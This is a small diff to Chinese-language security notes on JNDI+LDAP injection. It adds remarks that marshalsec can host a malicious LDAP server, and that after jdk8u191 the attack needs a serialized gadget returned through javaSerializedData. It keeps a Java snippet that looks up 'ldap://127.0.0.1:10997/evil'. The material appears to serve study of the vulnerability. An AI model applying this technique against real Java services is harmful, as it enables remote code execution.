@@ -7,9 +7,11 @@
 
 ^
 ## **JNDI+LDAP利用方式**
+使用marshalsec启动一个恶意的LDAP服务，可以执行恶意方法。
 ```
 public static void main(String[] args) throws NamingException {
     InitialContext context = new InitialContext();
     context.lookup( "ldap://127.0.0.1:10997/evil");
 }
 ```
+从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
